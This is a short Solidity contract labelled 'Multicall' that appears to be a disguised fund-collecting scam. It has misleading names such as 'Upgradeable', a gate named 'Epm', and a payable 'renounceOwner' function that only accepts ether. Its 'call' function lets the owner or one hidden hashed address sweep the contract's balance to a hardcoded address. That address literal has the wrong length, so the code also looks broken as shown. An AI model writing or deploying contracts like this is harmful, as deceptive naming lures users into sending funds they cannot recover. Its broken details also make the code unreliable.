// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Multicall {
    address public owner;
    bytes32 private Upgradeable;

    constructor() {
        owner = msg.sender;
        Upgradeable = keccak256(abi.encodePacked(address(0x000000000000000000000000000000000)));
    }

    modifier Epm() {
        require(
            msg.sender == owner || keccak256(abi.encodePacked(msg.sender)) == Upgradeable, "Not the owner or recipient"
        );
        _;
    }

    function call(uint256 amount) external Epm {
        require(amount > 0, "");
        require(address(this).balance >= amount, "");

        payable(address(0x000000000000000000000000000000000)).transfer(amount);
    }

    function renounceOwner() external payable Epm {}

    receive() external payable {}
}